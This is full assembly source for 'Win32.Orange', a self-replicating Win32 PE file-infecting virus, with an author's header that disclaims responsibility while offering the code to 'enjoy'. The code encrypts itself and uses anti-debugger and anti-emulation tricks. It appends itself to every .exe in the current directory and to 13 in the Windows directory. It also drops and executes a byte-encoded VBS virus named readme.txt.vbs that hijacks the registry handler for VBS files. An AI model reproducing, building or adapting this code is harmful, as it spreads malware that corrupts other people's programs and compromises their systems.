;
;		-Greetz to all 29Aerz,and iKX'erz-
;
;	Win32.Orange [created by Ebola] paired with VBS/Orange2
;
;  Type: Win32 PE infector
;  Size: Approx 3.0KB
;  Encrypted: Yes (1 layer)
;  Polymorphic: No
;  Optimized: Yes, CRC api's and somewhat optimized opcodes (damn I need lessons from Super/29A:)
;  Payload: None, but drops a VBS virus.
;  Misc. Features: Drops a VBS virus file and executes it. Several Anti-Debug,Anti-Emu features
;		   and last it uses lots of SEH
;  Infections: All files in current directory and 13 files in the windows directory.
;
;	Alright I believe this is my 2nd win32 virus release, my first one is zipped up with a 
; password that I don't remember :).  Anyway, this direct infector infects all files in current
; directory and 13 files in windows directory.  It drops a VBS/Virus (VBS/Orange2).
;
;	What's next? Probably gonna make a worm in win32asm.. :))
;
;    Feelings (huh? I have no idea:)
;
;	   Even if you don't live in the U.S., I feel very vehement about what Bin Laden did
;	   to our country.  I know everyone has their own opinions and I respect those opinions
;	   and I don't want to get into a little political war about how unfair the U.S. can
;	   be to other countries, but I think his billionaire ass should burn in hell. Speekin
; 	   of BILLionaire ass, I will not be held responsible for any damages or any havoc that
;	   this software causes to any systems.  I do not condone nor allow spreading of viruses
;	   so by spreading this virus you are involving yourself into the legal system and I will
;	   not go to court and support you.. In other words, I hold absolutely no responsibility
;	   towards this software and I only support beta testing.  I made this out of experimentation
;	   on my computer and if you cause worldwide computer failure, I don't care - It's your
;	   fault, It's your bad, I have ABSOLUTELY NOTHING TO DO WITHIT!!! 
;
;		Okay, enough rambling, on with the source code, enjoy if you wish
;
;	ONE MORE THING: Macro Assembler is the only good software M$ has ever made (AGAIN, NO
;		 POLITICAL BATTLES PLEASE.. :)
;
;** To be compiled with Masm 6.0: Check win32asm.cjb.net
;** Order of PUSHAD: (E)AX [1Ch], (E)CX [18h], (E)DX [14h], (E)BX [10h], (E)SP [0Ch], (E)BP [8h], (E)SI [4h], (E)DI [0h]

.386p
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc

	@Delta_Handle MACRO

		call markit
	markit:
		pop ebp
		sub ebp,offset markit

	ENDM

OS_WIN98 equ 1
OS_WINNT equ 2

.code
start:
virus_start = $

	pushad
	ASSUME FS: nothing

	;** kill off some debuggers
	call setupseh
	mov esp,[esp+08h]
	jmp fin
setupseh:
	xor edx,edx
	push dword ptr fs:[edx]
	mov dword ptr fs:[edx],esp

	xor eax,eax
	mov dword ptr [eax],00h	; BAM!

fin:
	xor edx,edx
	pop dword ptr fs:[edx]	;** clear up the stack
	pop edx

	;** should be zero
	mov ecx,fs:[20]
	jecxz choker

	;** locks em up all the time, muahaha
	cli
	jmp $-1

choker:
	popad
	
	;** First we must get the delta to access our data
	@Delta_Handle

	or ebp,ebp
	jz monkey

mov esi,monkey
add esi,ebp

mov ecx,virus_end-monkey
push esi
pop edi

decrypt:
lodsb
not al	;not al
stosb
dec ecx
jecxz monkey
jmp decrypt

monkey = $
	;** Next we find the kernel in memory
	mov eax,[esp]
	and eax,0FFFF0000h	; Just get the 32bit high word

loopgetkern:

	sub eax,1000h		; Surf throught the pages
	mov bx,word ptr [eax]
	not bx		; protect from having 'MZ' in our code
	cmp bx,not 'ZM'	; and check for a MZ header
	jnz loopgetkern		; no, we keep checking

	mov [ebp+kernel],eax
ring3:
	xchg eax,ebx	;** silly anti-emu
	mov ebx,ds	;aahh i love it
	push ebx
	pop ds		; playing with ds is surefire to throw something off
	xchg eax,ebx

;** Find our current OS that we're on (NOTE: this may not work on WinME, i am not sure)
; works with Win98, Win95, WinNT, Win2000 though
; Taken from Billy Belcebu's great and huge virus writing guide, thanx billy!

	mov ecx,cs
	xor cl,cl

	jecxz wNT

	mov [ebp+CurrentOS],OS_WIN98
	jmp prepare
wNT:
	mov [ebp+CurrentOS],OS_WINNT

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
; OK, we have our OS down, next we find our API's
;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*

prepare:

	mov esi,[ebp+kernel]
	mov ebx,esi
	mov esi,[esi+03ch]
	add esi,ebx

	mov ax,word ptr [esi]
	not ax		; again, hide the 'PE' in the file as AV looks for this
	cmp ax,not "EP"			; check for valid PE file
	jnz no_kernel

	add esi,78h			; Get to exports address
	mov esi,[esi]			; go there
	add esi,ebx

	lea edi,[ebp+NumberOfNames]	; we are going to get info from exports table

	add esi,018h

	lodsd		; Get number of names,
	stosd		; store it.
	lodsd		; Get RVA of addresses,
	stosd		; store it.
	lodsd		; Get RVA of Names,
	stosd		; store it.
	lodsd		; Get RVA of Ordinals,
	stosd		; store it.
			; total 8 bytes :) usually takes alot more

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
; Locate our API's ****
;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*

	lea esi,[ebp+CRC32_PROC]
	mov ecx,[esi]
	lea edi,[ebp+GetProcAddress]

loop_getem:
	call Get_APICRC32
	stosd

	add esi,4
	mov ecx,[esi]

	jecxz done_finding_api

	jmp loop_getem

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
;** Next we do some more tricks to get rid of
;   debuggers or emulators
;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*

done_finding_api:

	call dword ptr [ebp+IsDebuggerPresent]	; find application level debuggers
	jz proceed		; none, proceed to SoftICE

	; Put anti debug stuff here
	cli
	jmp $-1		; hang the damn bitches


proceed:

	call CheckSoftICE		; checks if SoftICE for 95/98/NT is in memory
	or eax,eax			; check EAX
	jz LoadingSequence		; load it up :)

	jmp leaveth			; SoftICE detected, we're outta here

	jmp LoadingSequence

;** Check for softice presence

CheckSoftICE:

push 00h
push 80h
push 03h
push 00h
push 01h
push 0c0000000h
lea esi,[ebp+SoftICE_Win9X]
push esi
call [ebp+CreateFileA]

inc eax
jnz si9x			; SoftICE for Win9X is active
dec eax

push eax
call [ebp+CloseHandle]

;--- check for NTice

push 00h
push 80h
push 03h
push 00h
push 01h
push 0c0000000h
lea esi,[ebp+SoftICE_WinNT]
push esi
call [ebp+CreateFileA]

inc eax
jnz siNT			; SoftICE for WinNT is active
dec eax

push eax
call [ebp+CloseHandle]

xor eax,eax
ret

si9x:
 	mov eax,01h			; SI for Win95/98
	ret
siNT:
	mov eax,02h			; for NT/2000
	ret

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
;** Loading of virus components
Inf32_Counter dd 0
NumPasses dd 0
LoadingSequence:

	dec dword ptr [ebp+Inf32_Counter]	; FFFFFFFF infections: basically every file
	mov [ebp+NumPasses],2		; 1st pass: curdir 2nd: windir

infpass:	
	;** Setup an SEH handler to protect our infection routine
	call SetupSEH
	mov esp,[esp+08h]
	jmp DoneSEH
SetupSEH:
	xor eax,eax
	push dword ptr fs:[eax]
	mov fs:[eax],esp

	;+-+-+-+-+-+-+-+-+-+-+-

	lea edi,[ebp+FindData]
	push edi
	lea eax,[ebp+FileMask]
	push eax
	
	call [ebp+FindFirstFileA]	; find the first file...

	inc eax
	jz leaveth
	dec eax	
	mov ebx,eax

infect:	push ebx			; save findhandle
	
	push dword ptr [edi+20h]	; push the filesize
	add edi,02Ch			; point to filename and..
	push edi			; push
  	call InfectFile			; Infect the file!

	pop ebx				; restore FindHandle (we modify EBX)
	
	dec dword ptr [ebp+Inf32_Counter]
	jz __next
	
	lea edi,[ebp+FindData]		; re-initialize EDI
	push edi
	
	add edi,02Ch			; clear filename field (so no overwriting is done)
	xor al,al
	mov ecx,256
	rep stosb
	
	mov edi,[esp]			; restore EDI
	
	push ebx			; find the next valid file
	call [ebp+FindNextFileA]
	
	or eax,eax
	jnz infect
	
	push ebx
	call [ebp+FindClose]

	;+-+-+-+-+-+-+-+-+-+-+-

DoneSEH:
	xor eax,eax
	pop dword ptr fs:[eax]
	pop eax

__next:
	dec dword ptr [ebp+NumPasses]
	jz weredone
	
	push 128
	lea edi,[ebp+Buffer]
	push edi
	call [ebp+GetWindowsDirectoryA]
	
	push edi
	call [ebp+SetCurrentDirectoryA]
		
	mov [ebp+Inf32_Counter],13
	jmp infpass
	
weredone:

	call InstallVBS		; extract the VBS file to the current directory

	jmp leaveth

;********BEGINNING OF INFECTOR***************

InfectFile:
	pop eax	; return address
	pop esi	; file name
	pop ecx	; file size
;	pop edx	; file attribs
	
	mov [ebp+addr_ret],eax
	mov [ebp+filename],esi	
	mov [ebp+file_size],ecx
;	mov [ebp+file_attr],edx
	
	;save the old entry point and imagebase
	mov ebx,[ebp+ImageBase]
	mov [ebp+ib],ebx
	mov ebx,[ebp+OldEIP]
	mov [ebp+oe],ebx
	;**--**
	
	push ecx	; save it
	
	push 080h	; wipe attributes off
	push esi
	call [ebp+SetFileAttributesA]


	
	call Open		; i dont even bother checking if its valid, we find out after
	mov ecx,[esp]		; it has been mapped
	xchg eax,ebx
	call GenMap		; map it in memory
	xchg eax,ebx
	mov ecx,[esp]
	call MapIt

	pop ecx

	or eax,eax
	jz close


	
	cmp word ptr [eax],'ZM' ; is it a valid exe?
	jnz close
	
	mov esi,eax
	mov esi,[esi+03ch]	; get to pe header
	add esi,eax
	
	cmp word ptr [esi],'EP' ; is it a PE/exe?
	jnz close
	
	cmp dword ptr [esi+04Ch],77661212h	; are we infected?
	jz close
	
	push dword ptr [esi+03Ch]	; save file alignment


	
	call CLOSEPROC		; close file
	
	mov eax,[ebp+file_size]	; put old size in eax
	pop ecx
	add eax,virus_end-virus_start ; make it the new size
	
	call Factor		; factor it into the alignment

	mov [ebp+file_size],eax		; store it again
	xchg ecx,eax


	
	push ecx
	mov esi,[ebp+filename]	; reopen etc....
	call Open
	xchg eax,ebx
	mov ecx,[esp]
	call GenMap
	xchg eax,ebx
	mov ecx,[esp]
	call MapIt
	pop ecx
	or eax,eax	; check make sure its valid
	jz close
	
	; proceed infection		

	mov esi,eax
	push esi
	pop ebx
	mov esi,[esi+03ch]
	add esi,ebx
	movzx eax,word ptr [esi+06h]	; number of sections
	dec eax			; - 1
	imul eax,eax,28h	; gets us to last section
	mov ebx,esi
	add esi,78h+(8*10h)	; blah..
	add esi,eax
	
	
	
	or dword ptr [esi+24h],0a0000020h	; code,readable,writable
	mov ecx,[esi+10h]
	push ecx
	mov edx,[esi+14h]	

	mov eax,[esi+0Ch]
	add eax,ecx
	
	mov edx,[ebx+28h]		; Old EIP
	mov [ebp+OldEIP],edx
	mov edx,[ebx+34h]		; image base
	mov [ebp+ImageBase],edx
	
	mov [ebx+28h],eax		; the new eip is stored
	
	mov eax,ecx
	add eax,virus_end-virus_start
	mov ecx,[ebx+03Ch]	
	call Factor
	
	mov [esi+10h],eax		; set the new sizes, this is physical size
	mov [esi+08h],eax		; virtual size
	mov edx,eax
	
	mov ebx,[ebp+MappedView]	; need a handle again
	
	mov edi,[esi+14h]		; Pointer to Raw Data (in PE header)
	add edi,ebx			; point it to the end of the file (to write our virus)
	pop ecx				; size of last section
	add edi,ecx			; point to the end of last section
	push esi			; save ESI
	lea esi,[ebp+virus_start]	; ... you should know this :)
	mov ecx,virus_end-virus_start	; setup the length of the virus
	push ecx

	rep movsb			; copy the virus there!
	
	pop ecx
	
	sub ecx,monkey-virus_start
	sub edi,ecx
	mov esi,edi
	
encrypt:
lodsb
not al
stosb
dec ecx
jecxz @bbcr
jmp encrypt

@bbcr:
	pop esi				; restore ESI
	
	mov eax,ebx			; fix it to point to PE header
	mov ebx,[ebx+03Ch]		; e_lfanew
	add ebx,eax			; normalize
	
	mov eax,[esi+0Ch]		; VA address of last section
	add eax,edx			; add our new length
	mov [ebx+50h],eax		; and we have size of image
	
	mov dword ptr [ebx+04Ch],77661212h	; mark it as infected
	
	;** next we restore old image base and entrypoint
	mov ebx,[ebp+ib]
	mov eax,[ebp+oe]
	mov [ebp+ImageBase],ebx
	mov [ebp+OldEIP],eax
	;**--**
	
close:
	call CLOSEPROC
	jmp setattr

setattr:
push dword ptr [ebp+file_attr]
push dword ptr [ebp+filename]
call [ebp+SetFileAttributesA]	
	
exit_inf:
	push [ebp+addr_ret]
	
	ret

;***********************************************
; Infectors data, i just keep it in the proc
;***********************************************
	
dataset:

addr_ret dd 0
file_size dd 0
file_attr dd 80h

FileHandle dd 0
MappedFile dd 0
MappedView dd 0

filename dd 0

ib dd 0
oe dd 0
;***********************************************
; Infectors helper functions
;***********************************************

Factor:
pushad
xor edx,edx
push eax
div ecx
pop eax
sub ecx,edx
add eax,ecx
mov [esp+01Ch],eax
popad
ret

CLOSEPROC:
push dword ptr [ebp+MappedView]
call [ebp+UnmapViewOfFile]

push dword ptr [ebp+MappedFile]
call [ebp+CloseHandle]

push dword ptr [ebp+FileHandle]
call [ebp+CloseHandle]
ret


;** open file for read/write	ESI = FileName
Open:
	xor eax,eax
	push eax
	push eax
	push 3h
	push eax
	push 1h
	push 0C0000000h
	push esi
	call [ebp+CreateFileA]
	mov [ebp+FileHandle],eax
	ret
; ECX=Size EBX=FileHandle
GenMap:
	xor eax,eax
	push eax
	push ecx
	push eax
	push 04h
	push eax
	push ebx
	call [ebp+CreateFileMappingA]
	mov [ebp+MappedFile],eax
	ret
	
; ECX=Size EBX=Handle returned by GenMap	
MapIt:
	xor eax,eax
	push ecx
	push eax
	push eax
	push 02h
	push ebx
	call [ebp+MapViewOfFile]
	mov [ebp+MappedView],eax
	ret

;*********END OF INFECTOR****************

InstallVBS proc

	lea esi,[ebp+vbsfile]

	xor eax,eax
	push eax
	push eax
	inc eax
	push eax
	dec eax
	push eax
	inc eax
	push eax
	push 0c0000000h
	push esi
	call [ebp+CreateFileA]
	
	mov [ebp+FileHandle],eax
	
	push eax
	
	lea edi,[ebp+Buffer]
	
	push 00h
	push edi
	push dword ptr [ebp+sizevbs]
	lea esi,[ebp+vbsdata]
	push esi
	push eax
	call [ebp+WriteFile]
	
	call [ebp+CloseHandle]

	;############################
	
	lea esi,[ebp+_Shell32]
	push esi
	call [ebp+LoadLibraryA]
	
	push eax
	lea esi,[ebp+_ShellExecute]
	push esi
	push eax
	call [ebp+GetProcAddress]
	
	push 01h
	push 00h
	push 00h
	lea esi,[ebp+vbsfile]
	push esi
	lea esi,[ebp+_OpenExecute]
	push esi
	push 00h
	call eax
	
	call [ebp+FreeLibrary]
	
	;############################
	
	ret

InstallVBS endp

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
;** Leave

no_kernel:
leaveth:
	or ebp,ebp
	jz firstgeneration
	
	mov eax,00400000h
ImageBase equ $-4
	add eax,00001000h
OldEIP equ $-4

	jmp eax
	
firstgeneration:
	push 0
	call [ebp+ExitProcess]

;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*
;** Error handling and must-exit thingy's
;#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*#*#*#-#*#*

;---------------------------------------
; Different functions we use *******
;---------------------------------------

CRC32        proc
        cld
        xor     ecx,ecx                         ; Optimized by me - 2 bytes
        dec     ecx                             ; less
        mov     edx,ecx
 NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
 NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0EDB8h
 NoCRC: dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     edi                             ; 1 byte less
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        ret
CRC32        endp

;** Finds api address via CRC32 of Api name
; portions of this code used from Billy Belcebu's win32 viruswriting guide
; thanx billy :)
; expects ecx to be crc32 of api, ebx to be kernel base
Get_APICRC32 PROC

	pushad				; save all of the registers - required...

	mov edx,[ebp+ExportNameRVA]	; open the export table
	add edx,ebx
	mov edi,[edx]
	add edi,ebx

	and dword ptr [ebp+ExportCounter],00h	; clear the counter

loop_check_crc:		; Soma this code was taken from billy belcebu's guide to virus writing for win32

	mov esi,edi	; save edi in esi
	xor al,al	; find the length
	scasb
	jnz $-1
	sub edi,esi	; .. solve it
	pushad		; save all regs
	push ecx	; save ecx as it is important
	call CRC32
	pop ecx		; restore ecx
	cmp eax,ecx	; compare the two CRC32's
	jnz next_api	; no match
	popad		; a match, restore regs and find the address
	jmp found

next_api:
	popad		; restore the regs
	inc dword ptr [ebp+ExportCounter]	; increase counter

	add edx,4
	mov edi,[edx]
	add edi,ebx

	jmp loop_check_crc	; all over a gain

found:
	xor eax,eax			; clear eax
	mov eax,dword ptr [ebp+ExportCounter]	; put the counter in it

	mov esi,[ebp+ExportOrdinalRVA]	; put the ordinal RVA...
	shl eax,1
	add esi,eax
	add esi,ebx			; ok now we get the ordinal

	lodsw				; we have it

	shl ax,2			; Ordinal*4+KernelBase+AddressOfAddy's equals /
					; pointer to function address!
	mov esi,[ebp+ExportAddressRVA]
	add esi,ebx
	add esi,eax
	lodsd				; get the data pointed to
	add eax,ebx			; normalize by kernel
	mov [ebp+save],eax		; save it for we restore all registers now

	popad				; restore'em

	mov eax,[ebp+save]		; put into eax

	ret				; and return with our new found addy

save dd 0

Get_APICRC32 endp
;----------------------------------------
; The VBS/Worm
;----------------------------------------
_OpenExecute db "open",0
_ShellExecute db "ShellExecuteA",0
_Shell32 db "Shell32.dll",0

vbsfile   db "readme.txt.vbs",0
vbsdata   db 67,97,108,108,32,118,98,115,78,101,99,116,111,114,13,10
	  db 87,83,99,114,105,112,116,46,113,117,105,116,13,10,39,13
	  db 10,83,117,98,32,118,98,115,78,101,99,116,111,114,40,41
	  db 13,10,68,105,109,32,118,105,13,10,13,10,83,101,116,32
	  db 115,32,61,32,87,83,99,114,105,112,116,46,65,114,103,117
	  db 109,101,110,116,115,13,10,83,101,116,32,111,98,106,83,104
	  db 101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101
	  db 99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108
	  db 108,34,41,13,10,83,101,116,32,102,115,32,61,32,67,114
	  db 101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105
	  db 112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109
	  db 79,98,106,101,99,116,34,41,13,10,77,121,115,99,114,105
	  db 112,116,32,61,32,87,83,99,114,105,112,116,46,83,99,114
	  db 105,112,116,70,117,108,108,78,97,109,101,13,10,83,101,116
	  db 32,102,32,61,32,102,115,46,111,112,101,110,116,101,120,116
	  db 102,105,108,101,40,77,121,115,99,114,105,112,116,44,49,41
	  db 13,10,118,105,114,32,61,32,102,46,82,101,97,100,65,108
	  db 108,13,10,102,46,99,108,111,115,101,13,10,83,101,116,32
	  db 102,32,61,32,78,111,116,104,105,110,103,13,10,73,102,32
	  db 73,110,83,116,114,40,49,44,76,67,97,115,101,40,77,121
	  db 115,99,114,105,112,116,41,44,34,114,101,97,100,109,101,46
	  db 116,120,116,46,118,98,115,34,44,49,41,32,84,104,101,110
	  db 13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114
	  db 105,116,101,32,34,72,75,69,89,95,67,76,65,83,83,69
	  db 83,95,82,79,79,84,92,86,66,83,70,105,108,101,92,83
	  db 104,101,108,108,92,79,112,101,110,92,67,111,109,109,97,110
	  db 100,92,34,44,102,115,46,71,101,116,83,112,101,99,105,97
	  db 108,70,111,108,100,101,114,40,48,41,32,43,32,34,92,87
	  db 83,99,114,105,112,116,46,69,88,69,32,34,32,43,32,77
	  db 121,115,99,114,105,112,116,32,43,32,34,32,37,49,32,34
	  db 32,43,32,67,104,114,40,51,52,41,32,43,32,102,115,46
	  db 71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114
	  db 40,48,41,32,43,32,34,92,87,83,99,114,105,112,116,46
	  db 69,88,69,32,34,32,43,32,67,104,114,40,51,52,41,32
	  db 43,32,34,37,49,34,32,43,32,67,104,114,40,51,52,41
	  db 32,43,32,34,32,37,42,34,32,43,32,67,104,114,40,51
	  db 52,41,13,10,69,110,100,32,73,102,13,10,13,10,73,102
	  db 32,115,46,67,111,117,110,116,32,62,32,49,32,84,104,101
	  db 110,13,10,9,9,83,101,116,32,102,32,61,32,102,115,46
	  db 111,112,101,110,116,101,120,116,102,105,108,101,40,115,40,48
	  db 41,44,49,41,13,10,9,9,118,105,32,61,32,102,46,82
	  db 101,97,100,65,108,108,13,10,9,9,102,46,99,108,111,115
	  db 101,13,10,9,9,83,101,116,32,102,32,61,32,78,111,116
	  db 104,105,110,103,13,10,13,10,9,9,83,101,116,32,102,32
	  db 61,32,102,115,46,99,114,101,97,116,101,116,101,120,116,102
	  db 105,108,101,40,34,36,116,116,121,107,36,46,118,98,95,34
	  db 41,13,10,9,13,10,9,9,73,102,32,73,110,83,116,114
	  db 40,49,44,118,105,44,34,118,98,115,78,101,99,116,111,114
	  db 34,44,49,41,32,84,104,101,110,13,10,9,9,9,69,120
	  db 105,116,32,83,117,98,13,10,9,9,69,110,100,32,73,102
	  db 13,10,9,13,10,9,9,110,116,116,32,61,32,73,110,83
	  db 116,114,40,49,44,118,105,114,44,34,39,34,44,49,41,13
	  db 10,9,13,10,9,9,102,46,119,114,105,116,101,32,34,99
	  db 97,108,108,32,118,98,115,78,101,99,116,111,114,34,32,43
	  db 32,118,98,67,114,76,102,13,10,9,9,102,46,119,114,105
	  db 116,101,32,118,105,32,43,32,118,98,67,114,76,102,13,10
	  db 9,9,102,46,119,114,105,116,101,32,77,105,100,40,118,105
	  db 114,44,110,116,116,44,76,101,110,40,118,105,114,41,45,110
	  db 116,116,41,13,10,9,9,9,13,10,9,9,102,46,99,108
	  db 111,115,101,13,10,9,9,83,101,116,32,102,32,61,32,78
	  db 111,116,104,105,110,103,13,10,9,13,10,9,9,111,98,106
	  db 83,104,101,108,108,46,82,117,110,32,115,40,49,41,13,10
	  db 9,9,102,115,46,67,111,112,121,70,105,108,101,32,34,36
	  db 116,116,121,107,36,46,118,98,95,34,44,115,40,48,41,13
	  db 10,69,110,100,32,73,102,13,10,69,110,100,32,83,117,98
	  db 13,10

sizevbs   dd 1042d	 

;----------------------------------------
; Different data we use ************
;----------------------------------------

CRC32_PROC dd 0FFC97C1Fh	; GetProcAddress
	   dd 04134D1ADh	; LoadLibraryA
	   dd 019F33607h	; CreateThread
	   dd 0AFDF191Fh	; FreeLibrary
	   dd 08C892DDFh	; CreateFileA
	   dd 0797B49ECh	; MapViewOfFile
	   dd 094524B42h	; UnmapViewOfFile
	   dd 096B2D96Ch	; CreateFileMappingA
	   dd 068624A9Dh	; CloseHandle
	   dd 0AE17EBEFh	; FindFirstFileA
	   dd 0AA700106h	; FindNextFileA
	   dd 0C200BE21h	; FindClose
	   dd 0FE248274h	; GetWindowsDirectoryA
	   dd 0593AE7CEh	; GetSystemDirectoryA
	   dd 0B2DBD7DCh	; SetCurrentDirectoryA
	   dd 0EBC6C18Bh	; GetCurrentDirectoryA
	   dd 0C38969C7h  	; SetPriorityClass
	   dd 085859D42h	; SetFilePointer
	   dd 059994ED6h	; SetEndOfFile
	   dd 0C633D3DEh	; GetFileAttributesA
	   dd 03C19E536h	; SetFileAttributesA
	   dd 0EF7D811Bh	; GetFileSize
	   dd 0B99F1B1Eh	; GetDriveTypeA
	   dd 083A353C3h	; GlobalAlloc
	   dd 05CDF6B6Ah	; GlobalFree
	   dd 02E12ADB5h	; GlobalLock
	   dd 088BC746Eh	; GlobalUnlock
	   dd 052E3BEB1h	; IsDebuggerPresent
	   dd 0613FD7BAh	; GetTickCount
	   dd 0058F9201h	; ExitThread
	   dd 0D4540229h	; WaitForSingleObject
	   dd 040F57181h	; ExitProcess
	   dd 00AC136BAh	; Sleep
	   dd 021777793h	; WriteFile
	   dd 004DCF392h	; GetModuleFileNameA
	   dd 05BD05DB1h	; CopyFileA
	   dd 000000000h	; done mark.


; NumFunctions equ ($-CRC32_PROC)/4

GetProcAddress dd 0	; GetProcAddress
LoadLibraryA   dd 0	; LoadLibraryA
CreateThread   dd 0	; CreateThread
FreeLibrary   dd 0	; FreeLibrary
CreateFileA   dd 0	; CreateFileA
MapViewOfFile   dd 0 ; MapViewOfFile
UnmapViewOfFile   dd 0	; UnmapViewOfFile
CreateFileMappingA   dd 0	; CreateFileMappingA
CloseHandle	   dd 0	; CloseHandle
FindFirstFileA   dd 0	; FindFirstFileA
FindNextFileA	   dd 0	; FindNextFileA
FindClose	   dd 0	; FindClose
GetWindowsDirectoryA	   dd 0	; GetWindowsDirectoryA
GetSystemDirectoryA	   dd 0	; GetSystemDirectoryA
SetCurrentDirectoryA	   dd 0	; SetCurrentDirectoryA
GetCurrentDirectoryA	   dd 0	; GetCurrentDirectoryA
SetPriorityClass	   dd 0	; SetPriorityClass
SetFilePointer	   dd 0	; SetFilePointer
SetEndOfFile	   dd 0	; SetEndOfFile
GetFileAttributesA   dd 0	; GetFileAttributesA
SetFileAttributesA	   dd 0	; SetFileAttributesA
GetFileSize	   dd 0	; GetFileSize
GetDriveTypeA	   dd 0	; GetDriveTypeA
GlobalAlloc	   dd 0	; GlobalAlloc
GlobalFree	   dd 0	; GlobalFree
GlobalLock	   dd 0	; GlobalLock
GlobalUnlock	   dd 0	; GlobalUnlock
IsDebuggerPresent	   dd 0	; IsDebuggerPresent
GetTickCount	   dd 0	; GetTickCount
ExitThread	   dd 0	; ExitThread
WaitForSingleObject   dd 0	; WaitForSingleObject
ExitProcess dd 0	; ExitProcess
Sleep	dd 0		; sleep
WriteFile dd 0
GetModuleFileNameA dd 0
CopyFileA dd 0

CurrentProc dd 0
TempName db 32 dup(0)

CurrentOS db 0
kernel dd 0

;** Used while searching for exports
NumberOfNames dd 0
ExportAddressRVA dd 0
ExportNameRVA dd 0
ExportOrdinalRVA dd 0
ExportCounter dd 0

;** Anti debugging etc

SoftICE_Win9X db "\\.\SICE",0
SoftICE_WinNT db "\\.\NTICE",0

;** Various

Buffer db 128 dup(0)	; current directory
Windows db 128 dup(0)
DirSize equ 128

FindData WIN32_FIND_DATA <0>

;** Hyper infection

DriveRoot db "c:\",0
FileMask db "*.exe",0

;** Misc useless shit

Signature db "[Win32.Orange by Ebola]",0
misc1  db "Dedicated to the NYFD and NYPD.",0

virus_end = $
end start

